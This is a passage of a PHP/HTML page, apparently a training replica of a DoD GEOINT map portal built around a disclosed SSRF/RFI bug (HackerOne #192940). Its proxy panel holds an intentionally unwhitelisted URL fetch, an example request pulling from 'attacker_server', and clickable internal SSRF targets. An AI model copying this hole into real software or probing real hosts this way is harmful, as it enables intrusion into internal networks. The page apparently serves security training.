          L 494,271 L 488,256 L 482,240 L 476,224
          L 470,208 L 464,191 Z"/>
        <!-- Horn of Africa -->
        <path class="land" d="M 535,220 L 546,220 L 558,229 L 560,240 L 553,247 L 545,244 L 537,235 Z"/>
        <!-- Madagascar -->
        <path class="land" d="M 558,290 L 563,283 L 569,287 L 570,298 L 566,307 L 558,310 L 554,302 L 555,292 Z"/>

        <!-- === RUSSIA (top band) === -->
        <path class="land" d="
          M 540,135 L 560,128 L 585,122 L 612,117 L 640,114
          L 668,112 L 700,111 L 730,112 L 758,114 L 786,117
          L 814,120 L 840,122 L 862,122 L 880,120 L 898,118
          L 910,118 L 916,123 L 912,132 L 902,140 L 887,147
          L 870,149 L 851,147 L 833,144 L 814,143 L 796,141
          L 779,141 L 762,141 L 745,143 L 728,141 L 712,141
          L 694,143 L 678,141 L 661,143 L 644,143 L 628,141
          L 611,143 L 595,141 L 578,143 L 562,141 L 546,143
          L 532,143 L 525,137 L 524,129 L 528,122 Z"/>
        <!-- Kamchatka peninsula -->
        <path class="land" d="M 916,120 L 924,125 L 928,137 L 923,148 L 915,152 L 909,145 L 910,133 Z"/>

        <!-- === MIDDLE EAST / TURKEY / ARABIA === -->
        <path class="land" d="
          M 538,143 L 556,141 L 573,141 L 591,143 L 609,141
          L 628,143 L 643,143 L 658,149 L 665,157 L 664,168
          L 657,176 L 647,181 L 634,183 L 620,181 L 607,178
          L 594,181 L 580,183 L 566,181 L 552,178 L 542,172
          L 534,163 L 533,153 Z"/>
        <!-- Arabian Peninsula -->
        <path class="land" d="
          M 574,180 L 590,184 L 604,190 L 614,199 L 618,210
          L 616,221 L 609,230 L 600,234 L 592,231 L 585,221
          L 578,210 L 572,199 L 569,188 Z"/>
        <!-- Iran / Central Asia above Arabia -->
        <path class="land" d="
          M 628,143 L 655,143 L 678,141 L 700,138 L 720,135
          L 740,132 L 762,130 L 784,128 L 808,128
          L 828,131 L 848,134 L 866,137 L 882,141
          L 882,148 L 868,153 L 855,160 L 838,165
          L 820,167 L 803,164 L 786,163 L 769,164
          L 753,167 L 736,169 L 720,169 L 704,167
          L 688,169 L 672,167 L 658,165 L 644,162 L 630,156 L 624,149 Z"/>

        <!-- === INDIAN SUBCONTINENT === -->
        <path class="land" d="
          M 664,168 L 682,169 L 698,172 L 712,182
          L 720,194 L 724,208 L 722,220 L 717,231
          L 708,238 L 700,242 L 691,239 L 682,230
          L 677,218 L 674,207 L 671,196 L 667,185 Z"/>
        <!-- Sri Lanka -->
        <path class="land" d="M 717,245 L 721,242 L 725,245 L 722,251 L 717,251 Z"/>

        <!-- === SE ASIA PENINSULA (Indochina+Malaysia) === -->
        <path class="land" d="
          M 769,167 L 784,169 L 798,172 L 810,179
          L 818,189 L 820,200 L 817,212 L 810,222
          L 803,231 L 797,240 L 791,250 L 786,260
          L 781,268 L 776,271 L 770,269 L 766,260
          L 764,248 L 766,236 L 769,222 L 770,210
          L 769,198 L 768,186 L 768,175 Z"/>

        <!-- === INDONESIA (simplified) === -->
        <!-- Sumatra -->
        <path class="land" d="M 748,252 L 760,244 L 772,244 L 781,250 L 782,260 L 777,268 L 766,271 L 752,265 Z"/>
        <!-- Java -->
        <path class="land" d="M 764,280 L 778,276 L 792,276 L 803,281 L 801,287 L 789,290 L 773,289 L 762,285 Z"/>
        <!-- Borneo -->
        <path class="land" d="M 796,235 L 810,228 L 822,228 L 831,235 L 833,246 L 829,256 L 818,263 L 806,265 L 795,259 L 791,247 Z"/>
        <!-- Sulawesi (simplified) -->
        <path class="land" d="M 842,238 L 849,232 L 854,237 L 853,248 L 847,253 L 840,249 Z"/>

        <!-- === EAST ASIA (China+Korea peninsula) === -->
        <!-- Korea -->
        <path class="land" d="M 866,152 L 874,154 L 880,163 L 876,172 L 870,174 L 863,170 L 861,162 Z"/>

        <!-- === JAPAN === -->
        <path class="land" d="M 888,140 L 897,135 L 907,137 L 912,146 L 908,155 L 900,157 L 892,154 L 887,147 Z"/>
        <!-- Kyushu -->
        <path class="land" d="M 885,159 L 891,156 L 895,160 L 893,166 L 887,168 L 883,164 Z"/>

        <!-- === PHILIPPINES (simplified) === -->
        <path class="land" d="M 838,200 L 843,195 L 848,199 L 847,208 L 842,211 L 837,207 Z"/>
        <path class="land" d="M 843,214 L 848,211 L 851,217 L 849,224 L 843,225 L 840,219 Z"/>

        <!-- === AUSTRALIA === -->
        <path class="land" d="
          M 820,322 L 837,313 L 856,308 L 876,309
          L 896,312 L 914,321 L 925,334 L 927,348
          L 923,362 L 914,374 L 901,383 L 887,390
          L 871,393 L 854,390 L 836,382 L 824,370
          L 818,356 L 817,341 Z"/>
        <!-- Tasmania -->
        <path class="land" d="M 884,400 L 890,397 L 895,403 L 892,408 L 884,407 Z"/>

        <!-- === NEW ZEALAND === -->
        <path class="land" d="M 955,370 L 961,364 L 967,369 L 965,377 L 957,379 Z"/>
        <path class="land" d="M 952,386 L 960,382 L 965,390 L 961,399 L 953,397 L 950,390 Z"/>

        <!-- Country borders (subtle lines over landmasses) -->
        <!-- US-Canada border (49th parallel segment) -->
        <line class="border" x1="156" y1="112" x2="294" y2="112"/>
        <!-- US-Mexico border -->
        <path class="border" d="M 175,157 L 197,155 L 220,160 L 231,178"/>
        <!-- European internal borders -->
        <line class="border" x1="490" y1="153" x2="490" y2="168"/>
        <line class="border" x1="503" y1="148" x2="508" y2="165"/>
        <line class="border" x1="511" y1="148" x2="514" y2="165"/>
        <!-- Africa internal borders (simplified) -->
        <line class="border" x1="479" y1="220" x2="535" y2="220"/>
        <line class="border" x1="488" y1="250" x2="535" y2="250"/>
        <line class="border" x1="488" y1="165" x2="488" y2="220"/>
        <line class="border" x1="508" y1="165" x2="508" y2="220"/>

        <!-- === MILITARY BASE DOTS (militaryBaseLayer) === -->
        <circle class="military-dot" cx="280" cy="135" r="3.5" title="Pentagon / NOVA"/>
        <circle class="military-dot" cx="163" cy="118" r="3" title="JBLM"/>
        <circle class="military-dot" cx="234" cy="160" r="3" title="Fort Bliss"/>
        <circle class="military-dot" cx="550" cy="200" r="3" title="EUCOM Stuttgart"/>
        <circle class="military-dot" cx="609" cy="180" r="3" title="CENTCOM AOR"/>
        <circle class="military-dot" cx="869" cy="128" r="3" title="USFJ Yokota"/>
        <circle class="military-dot" cx="820" cy="350" r="3" title="Pine Gap"/>

        <!-- === LABELS === -->
        <text class="map-label-country" x="185" y="95" transform="rotate(-5,185,95)">CANADA</text>
        <text class="map-label-country" x="195" y="145">UNITED STATES</text>
        <text class="map-label-country" x="300" y="325" transform="rotate(-5,300,325)">BRAZIL</text>
        <text class="map-label-country" x="490" y="240">AFRICA</text>
        <text class="map-label-country" x="690" y="95">RUSSIA</text>
        <text class="map-label-country" x="690" y="155">CHINA</text>
        <text class="map-label-country" x="855" y="350">AUSTRALIA</text>
        <text class="map-label-city" x="277" y="133">● Washington DC</text>
        <text class="map-label-city" x="536" y="108">● London</text>
        <text class="map-label-city" x="601" y="91">● Moscow</text>
        <text class="map-label-city" x="816" y="136">● Beijing</text>
      </svg>

      <!-- Legend overlay -->
      <div class="map-legend">
        <div class="legend-title">Legend</div>
        <div class="legend-row"><div class="legend-swatch" style="background:#6baed6;border:1px solid #4a8ab8;"></div><span class="legend-label">countryBoundaryLayer</span></div>
        <div class="legend-row"><div class="legend-swatch" style="background:#e63946;"></div><span class="legend-label">Military Installations</span></div>
        <div class="legend-row"><div class="legend-swatch" style="background:#f5a623;"></div><span class="legend-label">Terrain Elevation</span></div>
        <div class="legend-row"><div class="legend-swatch" style="background:#9b59b6;"></div><span class="legend-label">Population Density</span></div>
        <div class="legend-row"><div class="legend-swatch" style="background:#2ecc71;"></div><span class="legend-label">Coastline Features</span></div>
      </div>

      <!-- Scale bar -->
      <div class="map-scale">
        <div class="map-scale-bar"></div>
        <span>2,500 km</span>
      </div>
      <div class="map-credits">Esri, NGA, DoD | Sources: NGA, USGS</div>
    </div>

    <!-- Map status bar -->
    <div class="map-status-bar">
      <div class="status-dot"></div>
      <span>5 layers active</span>
      <span class="status-sep">|</span>
      <span>Map: Light Gray Canvas (EPSG:4326)</span>
      <span class="status-sep">|</span>
      <span>Proxy: /proxys/plain.php</span>
      <span style="margin-left:auto;color:#c0392b;font-weight:600;font-size:.62rem;">⚠ plain.php allows unrestricted URL fetch</span>
    </div>

    <!-- Proxy panel (below map) -->
    <div class="proxy-panel">
      <div class="proxy-panel-hd">
        <svg class="proxy-panel-hd-icon" viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
        <span class="proxy-panel-title">plain.php — WMS Proxy Service</span>
        <span class="proxy-endpoint-badge">GET /proxys/plain.php</span>
        <span style="margin-left:auto;font-size:.62rem;color:#888;">HackerOne #192940</span>
      </div>
      <div class="proxy-panel-bd">

        <div class="url-example">
<span class="ux-comment">// Normal WMS service request — fetches layer metadata</span>
<span class="ux-host">https://████.mil</span><span class="ux-path">/████/proxys/plain.php?</span><span class="ux-key">url</span>=<span class="ux-val">http://wms.geoint.mil/boundary/ows</span>&amp;<span class="ux-key">operation</span>=<span class="ux-val">GetParameterInfo</span>&amp;<span class="ux-key">parameter</span>=<span class="ux-val">countryBoundaryLayer</span>&amp;<span class="ux-key">outputFormat</span>=<span class="ux-val">JSON</span>

<span class="ux-comment">// No IP/domain whitelist — fetches ANY url including attacker-controlled hosts</span>
<span class="ux-host">https://████.mil</span><span class="ux-path">/████/proxys/plain.php?</span><span class="ux-key">url</span>=<span class="ux-danger">http://attacker_server/t.html</span>&amp;<span class="ux-key">operation</span>=<span class="ux-val">GetParameterInfo</span>&amp;<span class="ux-key">parameter</span>=<span class="ux-val">countryBoundaryLayer</span>&amp;<span class="ux-key">outputFormat</span>=<span class="ux-val">JSON</span></div>

        <div class="proxy-form">
          <label class="pf-label">Service URL (url parameter)</label>
          <div class="pf-url-row">
            <input type="text" class="pf-input" id="urlInput" value="http://wms.geoint.mil/boundary/ows" placeholder="http://...">
            <button class="pf-btn" onclick="sendProxy()">Send Request →</button>
          </div>
          <div class="pf-params">
            <div class="pf-field">
              <span class="pf-label">operation</span>
              <input type="text" class="pf-small-input" id="pOp" value="GetParameterInfo">
            </div>
            <div class="pf-field">
              <span class="pf-label">parameter</span>
              <input type="text" class="pf-small-input" id="pParam" value="countryBoundaryLayer">
            </div>
            <div class="pf-field">
              <span class="pf-label">outputFormat</span>
              <input type="text" class="pf-small-input" id="pFmt" value="JSON">
            </div>
          </div>
          <div class="pf-note">
            The <code>url</code> parameter is fetched server-side with no whitelist. Try: <code>http://127.0.0.1/index.php?internal=secret</code> for SSRF, or any attacker-controlled domain for RFI.
          </div>

          <div class="resp-wrap" id="respWrap">
            <div class="resp-bar">
              <span id="respStatus"></span>
              <span class="resp-ct" id="respCt"></span>
              <span style="font-size:.62rem;color:#888;" id="respSize"></span>
              <div class="resp-tabs">
                <button class="resp-tab active" id="tabRaw" onclick="showTab('raw')">Raw</button>
                <button class="resp-tab" id="tabRender" onclick="showTab('render')">Render</button>
              </div>
            </div>
            <pre class="resp-body" id="respRaw"></pre>
            <iframe id="respFrame" class="resp-frame" sandbox="allow-scripts allow-same-origin"></iframe>
          </div>
        </div>

      </div>
    </div>

  </div><!-- end center -->

  <!-- ── Right sidebar ─────────────────────────────────────────────────── -->
  <div>

    <div class="sb-panel">
      <div class="sb-hd"><div class="sb-hd-dot" style="background:#007ac2;"></div>Service Info</div>
      <div class="sb-bd">
        <div class="sb-row"><span class="sb-lbl">Host</span><span class="sb-val">████.mil</span></div>
        <div class="sb-row"><span class="sb-lbl">Server</span><span class="sb-val">Apache/2.4 PHP 5.6</span></div>
        <div class="sb-row"><span class="sb-lbl">Script</span><span class="sb-val">/proxys/plain.php</span></div>
        <div class="sb-row"><span class="sb-lbl">Auth</span><span class="sb-val sb-warn">None (unauthenticated)</span></div>
        <div class="sb-row"><span class="sb-lbl">Whitelist</span><span class="sb-val sb-warn">Not configured</span></div>
        <div class="sb-row"><span class="sb-lbl">Reported</span><span class="sb-val">Dec 21, 2016</span></div>
        <div class="sb-row"><span class="sb-lbl">Resolved</span><span class="sb-val">Mar 20, 2018</span></div>
      </div>
    </div>

    <div class="sb-panel warn">
      <div class="sb-hd"><div class="sb-hd-dot" style="background:#e63946;"></div>Attack Vectors</div>
      <div class="sb-bd" style="padding:6px 10px;">
        <div class="av-row">
          <div class="av-icon tag-rfi"><svg viewBox="0 0 24 24"><path d="M4 14.899A7 7 0 1115.71 8h1.79a4.5 4.5 0 012.5 8.242"/><path d="M12 12v9M8 17l4 4 4-4"/></svg></div>
          <div><div class="av-name">Remote File Inclusion</div><div class="av-desc">Fetch attacker-controlled HTML/PHP via <code style="font-size:.6rem;background:#f8f0f0;padding:1px 3px;">url=</code></div></div>
        </div>
        <div class="av-row">
          <div class="av-icon tag-xss"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
          <div><div class="av-name">XSS via Rendered Content</div><div class="av-desc">Remote HTML with <code style="font-size:.6rem;">&lt;script&gt;</code> fires on DoD domain</div></div>
        </div>
        <div class="av-row" style="border-bottom:none;">
          <div class="av-icon tag-ssrf"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20"/></svg></div>
          <div><div class="av-name">SSRF — Internal Access</div><div class="av-desc">Proxy reaches internal resources invisible from outside</div></div>
        </div>
      </div>
    </div>

    <div class="sb-panel ssrf">
      <div class="sb-hd"><div class="sb-hd-dot" style="background:#6741d9;"></div>SSRF — Internal Network</div>
      <div class="sb-bd" style="padding:6px 10px;">
        <div style="font-size:.63rem;color:#666;margin-bottom:5px;">Click to probe via proxy:</div>
        <?php
        $ssrfTargets = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://10.10.2.15/',
            'http://10.10.2.1/',
            'http://192.168.1.1/',
        ];
        foreach ($ssrfTargets as $t): ?>
        <div class="ssrf-target" onclick="document.getElementById('urlInput').value='<?= esc($t) ?>';document.getElementById('urlInput').focus();">
          <svg viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
          <?= esc($t) ?>
        </div>
        <?php endforeach; ?>
      </div>
    </div>

    <div class="sb-panel">
      <div class="sb-hd"><div class="sb-hd-dot" style="background:#007ac2;"></div>WMS Operations</div>
      <div class="sb-bd" style="padding:6px 10px;">
        <div class="wms-op"><span class="wms-op-name">GetCapabilities</span><span class="badge-get">GET</span></div>
        <div class="wms-op"><span class="wms-op-name">GetMap</span><span class="badge-get">GET</span></div>
        <div class="wms-op"><span class="wms-op-name">GetFeatureInfo</span><span class="badge-get">GET</span></div>
        <div class="wms-op" style="border-bottom:none;"><span class="wms-op-name">GetParameterInfo</span><span class="badge-get">GET</span></div>
      </div>
    </div>

  </div>

</div><!-- .app-body -->

<footer>
  <span><span class="esri-logo-text">ArcGIS</span> Enterprise 10.9.1 &nbsp;·&nbsp; DoD GEOINT Portal v2.1.4 &nbsp;·&nbsp; National Geospatial-Intelligence Agency</span>
  <span>Based on <a href="https://hackerone.com/reports/192940" target="_blank" rel="noopener">HackerOne #192940</a></span>
</footer>

<script>
var urlInput = document.getElementById('urlInput');
var currentUrl = '';

async function sendProxy() {
    var url   = urlInput.value.trim();
    var op    = document.getElementById('pOp').value;
    var param = document.getElementById('pParam').value;
    var fmt   = document.getElementById('pFmt').value;
    if (!url) return;
    currentUrl = url;

    var proxyUrl = 'index.php?url=' + encodeURIComponent(url)
        + '&operation=' + encodeURIComponent(op)
        + '&parameter=' + encodeURIComponent(param)
        + '&outputFormat=' + encodeURIComponent(fmt);

    var wrap     = document.getElementById('respWrap');
    var statusEl = document.getElementById('respStatus');
    var ctEl     = document.getElementById('respCt');
    var sizeEl   = document.getElementById('respSize');
    var rawEl    = document.getElementById('respRaw');

    wrap.style.display = 'block';
    showTab('raw');
    rawEl.className   = 'resp-body';
    rawEl.textContent = 'Fetching…';
    statusEl.className = ''; statusEl.textContent = '';

    try {
        var resp = await fetch(proxyUrl);
        var text = await resp.text();
        sizeEl.textContent = text.length + ' bytes';
        ctEl.textContent   = resp.headers.get('Content-Type') || '';
        if (resp.status === 200) {
            statusEl.className = 's200'; statusEl.textContent = 'HTTP 200 OK';
        } else {
            statusEl.className = 's502'; statusEl.textContent = 'HTTP ' + resp.status;
            rawEl.className    = 'resp-body err';
        }
        rawEl.textContent = text;
    } catch(e) {
        wrap.style.display = 'block';
        statusEl.className = 's502'; statusEl.textContent = 'Error';
        rawEl.className    = 'resp-body err';
        rawEl.textContent  = e.message;
    }
}

function showTab(tab) {
    var rawEl   = document.getElementById('respRaw');
    var frame   = document.getElementById('respFrame');
    var tabRaw  = document.getElementById('tabRaw');
    var tabRend = document.getElementById('tabRender');
    if (tab === 'raw') {
        rawEl.style.display = 'block'; frame.style.display = 'none';
        tabRaw.classList.add('active'); tabRend.classList.remove('active');
    } else {
        rawEl.style.display = 'none'; frame.style.display = 'block';
        tabRaw.classList.remove('active'); tabRend.classList.add('active');
        var op    = document.getElementById('pOp').value;
        var param = document.getElementById('pParam').value;
        var fmt   = document.getElementById('pFmt').value;
        frame.src = 'index.php?url=' + encodeURIComponent(currentUrl || urlInput.value)
            + '&operation=' + encodeURIComponent(op)
            + '&parameter=' + encodeURIComponent(param)
            + '&outputFormat=' + encodeURIComponent(fmt);
    }
}

urlInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') sendProxy();
});
</script>
</body>
</html>
